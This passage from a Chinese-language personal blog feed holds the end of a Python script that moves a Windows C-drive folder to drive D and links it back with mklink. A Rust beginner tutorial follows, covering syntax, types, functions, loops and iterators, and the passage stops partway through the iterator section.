<h2 id="迁移C盘自动链接脚本"><a href="#迁移C盘自动链接脚本" class="headerlink" title="迁移C盘自动链接脚本"></a>迁移C盘自动链接脚本</h2><p>如何使用请看：<a href="https://creeeeeeeeeeper.github.io/2024/10/01/cleanC/#more">清理C盘之数据迁移 | ZYG’s Notes (creeeeeeeeeeper.github.io)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">original_catalogue_path = <span class="built_in">input</span>(<span class="string">&quot;需迁移目录路径: &quot;</span>)</span><br><span class="line">new_catalogue_path = <span class="string">&#x27;D:\\AimportantDataLink&#x27;</span> + <span class="string">&quot;\\&quot;</span> + original_catalogue_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move_catalogue</span>(<span class="params">original_catalogue_path, new_catalogue_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(original_catalogue_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原目录不存在!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(new_catalogue_path):</span><br><span class="line">        os.makedirs(new_catalogue_path)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(original_catalogue_path):</span><br><span class="line">        original_item_path = os.path.join(original_catalogue_path, item)</span><br><span class="line">        new_item_path = os.path.join(new_catalogue_path, item)</span><br><span class="line">        shutil.move(original_item_path, new_item_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已移动: <span class="subst">&#123;original_item_path&#125;</span> -&gt; <span class="subst">&#123;new_item_path&#125;</span>&quot;</span>)</span><br><span class="line">    link_name = new_catalogue_path</span><br><span class="line">    command = <span class="string">f&#x27;mklink &quot;<span class="subst">&#123;original_catalogue_path&#125;</span>&quot; &quot;<span class="subst">&#123;link_name&#125;</span>&quot;&#x27;</span></span><br><span class="line">    shutil.rmtree(original_catalogue_path)</span><br><span class="line">    os.system(command)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;已创建链接: <span class="subst">&#123;link_name&#125;</span> -&gt; <span class="subst">&#123;new_catalogue_path&#125;</span>&quot;</span>)</span><br><span class="line">move_catalogue(original_catalogue_path, new_catalogue_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Rust</title>
    <url>/2025/03/29/rust/</url>
    <content><![CDATA[<p>rust开发</p>
<span id="more"></span>

<p>为什么要学习Rust？</p>
<blockquote>
<h2 id="Rust-语言的特点"><a href="#Rust-语言的特点" class="headerlink" title="Rust 语言的特点"></a>Rust 语言的特点</h2><ul>
<li><strong>内存安全</strong>：Rust 的所有权系统在编译时防止空悬指针、数据竞争等内存错误，无需垃圾收集器。</li>
<li><strong>并发编程</strong>：Rust 提供了现代的语言特性来支持并发编程，如线程和消息传递，使得编写并发程序更加安全和容易。</li>
<li><strong>性能</strong>：Rust 编译为机器码，没有运行时或垃圾收集器，能够提供接近 C 和 C++ 的性能。</li>
<li><strong>类型系统</strong>：Rust 的类型系统和模式匹配提供了强大的抽象能力，有助于编写更安全、更可预测的代码。</li>
<li><strong>错误处理</strong>：Rust 的错误处理模型鼓励显式处理所有可能的错误情况。</li>
<li><strong>宏系统</strong>：Rust 提供了一个强大的宏系统，允许开发者在编译时编写和重用代码。</li>
<li><strong>包管理</strong>：Rust 的包管理器 Cargo 简化了依赖管理和构建过程。</li>
<li><strong>跨平台</strong>：Rust 支持多种操作系统和平台，包括 Windows、macOS、Linux、BSDs 等。</li>
<li><strong>社区支持</strong>：Rust 有一个活跃的社区，提供了大量的库和工具。</li>
<li><strong>工具链</strong>：Rust 拥有丰富的工具链，包括编译器、包管理器、文档生成器等。</li>
<li><strong>无段错误</strong>：Rust 的所有权和生命周期规则保证了引用的有效性，从而避免了段错误。</li>
<li><strong>迭代器和闭包</strong>：Rust 提供了强大的迭代器和闭包支持，简化了集合的处理。</li>
</ul>
</blockquote>
<h1 id="Rust-基础语法"><a href="#Rust-基础语法" class="headerlink" title="Rust 基础语法"></a>Rust 基础语法</h1><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>rust有两个标准输出的函数，<code>println!()</code>和<code>print!()</code>，前者和后者的区别仅在于前者会多输出一个换行符</p>
<h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><p>C语言中使用<code>%(字母)</code>作为占位符，rust中使用的是<code>&#123;&#125;</code>进行占位</p>
<p>例如：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a is &#123;&#125;&quot;</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出得到：<code>a is 10</code></p>
<p>如果将a输出两遍，不需要在最后写两遍a，此时可以将后面的参数看成是一个数组，然后可以通过索引访问</p>
<p>例如：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a is &#123;0&#125;, a again is &#123;0&#125;&quot;</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出得到：<code>a is 10, a again is 10</code></p>
<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>rust的转义字符除<code>&#123;&#125;</code>外都是前面加反斜杠（和C语言一样），<code>&#123;&#125;</code>的转义是<code>&#123;&#123;`和`&#125;&#125;</code></p>
<p>例如：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#123;&#125;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：<code>&#123;&#125;</code></p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>rust使用let声明变量，但是一般声明的变量是不可变的变量</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line">a = <span class="number">5</span>; <span class="comment">// 这会报错</span></span><br></pre></td></tr></table></figure>

<p>如果需要后面对<code>a</code>再进行赋值，需要添加<code>mut</code>关键字</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line">a = <span class="number">5</span>; <span class="comment">// 这样是对的</span></span><br></pre></td></tr></table></figure>

<p>使用<code>mut</code>关键字声明的叫可变变量，没有使用<code>mut</code>关键字声明的是不可变变量</p>
<h4 id="不可变变量与常量"><a href="#不可变变量与常量" class="headerlink" title="不可变变量与常量"></a>不可变变量与常量</h4><p>不可变变量是不能重新进行赋值，但是可以重新进行声明的变量，常量不能重新赋值，也不能重新声明</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">20</span>; <span class="comment">// 这样是对的</span></span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">20</span>; <span class="comment">// 这样是错的</span></span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>rust是静态语言类型，在声明变量的时候可以显式指定类型</p>
<h4 id="基本类型："><a href="#基本类型：" class="headerlink" title="基本类型："></a>基本类型：</h4><table>
<thead>
<tr>
<th>i32</th>
<th>32位有符号整数</th>
</tr>
</thead>
<tbody><tr>
<td>u32</td>
<td>32位无符号整数</td>
</tr>
<tr>
<td>f64</td>
<td>64位浮点数</td>
</tr>
<tr>
<td>bool</td>
<td>布尔类型</td>
</tr>
<tr>
<td>char</td>
<td>字符</td>
</tr>
</tbody></table>
<p>如果不显式指定，那么编译器会自动判断该变量的类型</p>
<p><strong>整数型：</strong></p>
<table>
<thead>
<tr>
<th align="left">位长度</th>
<th align="left">有符号</th>
<th align="left">无符号</th>
</tr>
</thead>
<tbody><tr>
<td align="left">8-bit</td>
<td align="left">i8</td>
<td align="left">u8</td>
</tr>
<tr>
<td align="left">16-bit</td>
<td align="left">i16</td>
<td align="left">u16</td>
</tr>
<tr>
<td align="left">32-bit</td>
<td align="left">i32</td>
<td align="left">u32</td>
</tr>
<tr>
<td align="left">64-bit</td>
<td align="left">i64</td>
<td align="left">u64</td>
</tr>
<tr>
<td align="left">128-bit</td>
<td align="left">i128</td>
<td align="left">u128</td>
</tr>
<tr>
<td align="left">arch</td>
<td align="left">isize</td>
<td align="left">usize</td>
</tr>
</tbody></table>
<p>isize 和 usize 两种整数类型是用来衡量数据大小的，它们的位长度取决于所运行的目标平台，如果是 32 位架构的处理器将使用 32 位位长度整型。</p>
<p>整数的表述方法有以下几种：</p>
<table>
<thead>
<tr>
<th align="left">进制</th>
<th align="left">例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">十进制</td>
<td align="left">98_222</td>
</tr>
<tr>
<td align="left">十六进制</td>
<td align="left">0xff</td>
</tr>
<tr>
<td align="left">八进制</td>
<td align="left">0o77</td>
</tr>
<tr>
<td align="left">二进制</td>
<td align="left">0b1111_0000</td>
</tr>
<tr>
<td align="left">字节(只能表示 u8 型)</td>
<td align="left">b’A’</td>
</tr>
</tbody></table>
<p>在上面的例子中，可以看到数字中间添加了下划线，下划线本身没有任何意义，只是提高了代码的可读性，<code>1_234</code>和<code>1234</code>是一样的，前者更容易读出他是一个“千”位的数字</p>
<p><strong>浮点数型</strong>（Floating-Point）</p>
<p>默认情况下，64.0 将表示 64 位浮点数，因为现代计算机处理器对两种浮点数计算的速度几乎相同，但 64 位浮点数精度更高。</p>
<p><strong>字符型</strong></p>
<p>字符型用 char 表示。</p>
<p>Rust的 char 类型大小为 4 个字节，代表 <strong>Unicode</strong>标量值，这意味着它可以支持中文，日文和韩文字符等非英文字符甚至表情符号和零宽度空格在 Rust 中都是有效的 char 值。</p>
<p>Unicode 值的范围从 U+0000 到 U+D7FF 和 U+E000 到 U+10FFFF （包括两端）。 但是，”字符”这个概念并不存在于 Unicode 中，因此您对”字符”是什么的直觉可能与Rust中的字符概念不匹配。所以一般推荐使用字符串储存 UTF-8 文字（非英文字符尽可能地出现在字符串中）。</p>
<p><strong>注意：</strong>由于中文文字编码有两种（GBK 和 UTF-8），所以编程中使用中文字符串有可能导致乱码的出现，这是因为源程序与命令行的文字编码不一致，所以在 Rust 中<strong>字符串和字符都必须使用 UTF-8 编码</strong>，否则编译器会报错。</p>
<h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><p>rust支持自运算操作，如<code>sum += 1</code> &#x3D; <code>sum = sum + 1</code></p>
<p>但是不支持自增和自减的<code>++</code>和<code>--</code></p>
<h4 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h4><p>元组是用一对 <code>()</code> 包括的一组数据，可以包含不同种类的数据：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// tup.0 等于 500</span></span><br><span class="line"><span class="comment">// tup.1 等于 6.4</span></span><br><span class="line"><span class="comment">// tup.2 等于 1</span></span><br><span class="line"><span class="keyword">let</span> (x, y, z) = tup;</span><br><span class="line"><span class="comment">// y 等于 6.4</span></span><br></pre></td></tr></table></figure>

<p>数组用一对 <code>[]</code>包括的同类型数据。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// a 是一个长度为 5 的整型数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = [<span class="string">&quot;January&quot;</span>, <span class="string">&quot;February&quot;</span>, <span class="string">&quot;March&quot;</span>];</span><br><span class="line"><span class="comment">// b 是一个长度为 3 的字符串数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">c</span>: [<span class="type">i32</span>; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// c 是一个长度为 5 的 i32 数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">d</span> = [<span class="number">3</span>; <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 等同于 let d = [3, 3, 3, 3, 3];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">first</span> = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">second</span> = a[<span class="number">1</span>];</span><br><span class="line"><span class="comment">// 数组访问</span></span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>] = <span class="number">123</span>; <span class="comment">// 错误：数组 a 不可变</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">4</span>; <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数的基本格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn &lt;函数名&gt; ( &lt;参数&gt; ) &lt;函数体&gt;</span><br></pre></td></tr></table></figure>

<p>rust函数命名风格是小写字母加下划线分割</p>
<p>rust语言函数定义位置没有要求，可以在任意位置定义函数</p>
<p>定义函数如果有参数，则必须声明参数名称和类型：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">another_function</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">another_function</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x 的值为 : &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y 的值为 : &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Rust 中可以在一个用 <code>&#123;&#125;</code>包括的块里编写一个较为复杂的表达式：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x 的值为 : &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y 的值为 : &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x 的值为 : 5</span><br><span class="line">y 的值为 : 4</span><br></pre></td></tr></table></figure>

<p>在上面的程序中，包含了一个表达式块：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">    x + <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而且在块中可以使用函数语句，最后一个步骤是表达式，此表达式的结果值是整个表达式块所代表的值。这种表达式块叫做函数体表达式。</p>
<p>注意：**<code>x + 1</code>**之后没有分号，否则它将变成一条语句</p>
<p>rust不支持自动判断返回值类型，需要在函数声明时定义返回值的类型</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>(a: <span class="type">i32</span>, b: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有明确声明函数返回值的类型，函数将被认为是”纯过程”，不允许产生返回值，return 后面不能有返回值表达式。</p>
<p>而函数体表达式和函数体不一样，函数体表达式不能使用return关键字。</p>
<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">12</span>; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span>; </span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">0</span> &#123; </span><br><span class="line">        b = <span class="number">1</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> a &lt; <span class="number">0</span> &#123; </span><br><span class="line">        b = -<span class="number">1</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        b = <span class="number">0</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;b is &#123;&#125;&quot;</span>, b); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Rust 中的条件表达式必须是 bool 类型，例如下面的程序是错误的：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">number</span> = <span class="number">3</span>; </span><br><span class="line">    <span class="keyword">if</span> number &#123;   <span class="comment">// 报错，expected `bool`, found integerrustc(E0308)</span></span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然 C&#x2F;C++ 语言中的条件表达式用整数表示，非 0 即真，但这个规则在很多注重代码安全性的语言中是被禁止的。</p>
<p>所以可以使用函数体表达式构造一个三元条件运算</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">3</span>; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">number</span> = <span class="keyword">if</span> a &gt; <span class="number">0</span> &#123; <span class="number">1</span> &#125; <span class="keyword">else</span> &#123; -<span class="number">1</span> &#125;; </span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number 为 &#123;&#125;&quot;</span>, number); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">number 为 1</span><br></pre></td></tr></table></figure>

<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">number</span> = <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span> number != <span class="number">4</span> &#123; </span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, number); </span><br><span class="line">        number += <span class="number">1</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;EXIT&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for循环感觉和Python的for很像</p>
<p>以下例子中a.iter() 代表 a 的迭代器（iterator）</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]; </span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> a.<span class="title function_ invoke__">iter</span>() &#123; </span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;值为 : &#123;&#125;&quot;</span>, i); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; </span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]; </span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">5</span> &#123; </span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;&#125;] = &#123;&#125;&quot;</span>, i, a[i]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="loop循环"><a href="#loop循环" class="headerlink" title="loop循环"></a>loop循环</h3><p>这是rust原生的无限循环结构</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = [<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]; </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">i</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">location</span> = <span class="keyword">loop</span> &#123; </span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ch</span> = s[i];</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&#x27;O&#x27;</span> &#123; </span><br><span class="line">            <span class="keyword">break</span> i; </span><br><span class="line">        &#125; </span><br><span class="line">        i += <span class="number">1</span>; </span><br><span class="line">    &#125;; </span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot; \&#x27;O\&#x27; 的索引为 &#123;&#125;&quot;</span>, location); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><h3 id="创建迭代器"><a href="#创建迭代器" class="headerlink" title="创建迭代器"></a>创建迭代器</h3><p>最常见的方式是通过集合的 <code>.iter()</code>、<code>.iter_mut()</code> 或 <code>.into_iter()</code> 方法来创建迭代器：</p>
<ul>
<li><code>.iter()</code>：返回集合的不可变引用迭代器。</li>
<li><code>.iter_mut()</code>：返回集合的可变引用迭代器。</li>
<li><code>.into_iter()</code>：将集合转移所有权并生成值迭代器。</li>
</ul>
<p><code>.iter()</code>方法返回一个不可变引用的迭代器。可以遍历数组中的元素，但不能修改它们。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">element</span> <span class="keyword">in</span> arr.<span class="title function_ invoke__">iter</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>.iter_mut()</code> 方法返回一个可变引用的迭代器。不仅可以遍历数组中的元素，还可以修改它们的值。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">element</span> <span class="keyword">in</span> arr.<span class="title function_ invoke__">iter_mut</span>() &#123;</span><br><span class="line">    *element += <span class="number">1</span>; <span class="comment">// 修改元素的值</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，<code>element</code> 是数组元素的可变引用，因此可以通过解引用运算符 <code>*</code> 来修改元素的值。</p>
<blockquote>
<p>解引用运算符 <code>*</code> 在 Rust 中用于访问引用指向的值。引用在 Rust 中是一种指针类型，它允许你引用内存中的某个值而不需要拥有该值。解引用运算符 <code>*</code> 可以让你获取引用指向的实际值。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;a;  <span class="comment">// b 是 a 的引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a 的值是 &#123;&#125;&quot;</span>, a);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;b 引用的值是 &#123;&#125;&quot;</span>, *b);  <span class="comment">// 使用 *b 来获取 b 引用的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>.into_iter()</code> 方法将数组的所有权转移给迭代器，并生成一个值迭代器。这意味着迭代器会直接生成数组中的元素，而不是它们的引用。在遍历过程中，数组的所有权会被移动到迭代器中。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">element</span> <span class="keyword">in</span> arr.<span class="title function_ invoke__">into_iter</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，<code>element</code> 是数组中的元素本身。需要注意的是，使用 <code>.into_iter()</code> 之后，<code>arr</code> 就不再可用，因为它已经将所有权转移给了迭代器。</p>
<h3 id="迭代器方法"><a href="#迭代器方法" class="headerlink" title="迭代器方法"></a>迭代器方法</h3><p>Rust 的迭代器提供了丰富的方法来处理集合中的元素，其中一些常见的方法包括：</p>
<ul>
<li><strong><code>map()</code>：对每个元素应用给定的转换函数。</strong></li>
</ul>
<p><code>map()</code> 方法对迭代器中的每个元素应用一个指定的函数，返回一个新的迭代器，其中包含应用该函数后的结果。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">doubled</span>: <span class="type">Vec</span>&lt;_&gt; = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">map</span>(|&amp;x| x * <span class="number">2</span>).<span class="title function_ invoke__">collect</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, doubled); <span class="comment">// 输出: [2, 4, 6, 8]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>map()</code> 方法将数组中的每个元素乘以 2，返回一个新的迭代器，这个迭代器会被收集到一个向量中。</p>
<ul>
<li><strong><code>filter()</code>：根据给定的条件过滤集合中的元素。</strong></li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">evens</span>: <span class="type">Vec</span>&lt;_&gt; = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">filter</span>(|&amp;&amp;x| x % <span class="number">2</span> == <span class="number">0</span>).<span class="title function_ invoke__">collect</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, evens); <span class="comment">// 输出: [2, 4]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>filter()</code> 方法只保留了数组中能被 2 整除的元素。</p>
<ul>
<li><strong><code>fold()</code>：对集合中的元素进行累积处理。</strong></li>
</ul>
